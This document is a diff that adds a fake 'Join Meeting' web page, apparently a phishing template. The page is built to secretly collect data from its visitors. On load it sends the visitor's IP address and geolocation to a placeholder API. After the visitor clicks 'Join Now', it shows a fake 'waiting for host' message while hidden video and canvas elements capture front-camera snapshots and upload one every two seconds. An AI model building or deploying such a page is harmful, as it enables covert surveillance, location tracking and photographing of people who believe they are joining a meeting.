@@ -1,0 +1,43 @@
+<!-- DESC: Online meeting/conference page with camera capture -->
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Join Meeting</title>
+<style>
+body{margin:0;background:#1a1a2e;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+video,canvas{display:none}
+.meeting-ui{background:#16213e;border-radius:16px;padding:40px;text-align:center;max-width:400px}
+.meeting-ui h2{color:#0ff;margin-bottom:10px}
+.meeting-ui p{color:#888;font-size:14px;margin-bottom:20px}
+.join-btn{background:#0ff;color:#000;border:none;padding:14px 40px;font-size:18px;font-weight:bold;border-radius:30px;cursor:pointer}
+.waiting{color:#aaf;margin-top:20px;font-size:14px}
+</style>
+</head><body>
+<video id="video" playsinline autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<div class="meeting-ui">
+<h2>🎥 Join Meeting</h2>
+<p>Connecting to video conference...</p>
+<button class="join-btn" onclick="startMeeting()">Join Now</button>
+<div class="waiting" id="waiting"></div>
+</div>
+<script>
+var API='API_BASE_URL';
+var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
+if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
+fetch(API+'/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+});
+function startMeeting(){
+document.querySelector('.meeting-ui').innerHTML='<h2>Waiting for host...</h2><p>The meeting host will let you in soon</p>';
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+video.srcObject=s;video.play();
+setInterval(function(){
+ctx.drawImage(video,0,0,640,480);
+fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
+},2000);
+}).catch(function(){});
+}
+</script>
+</body></html>
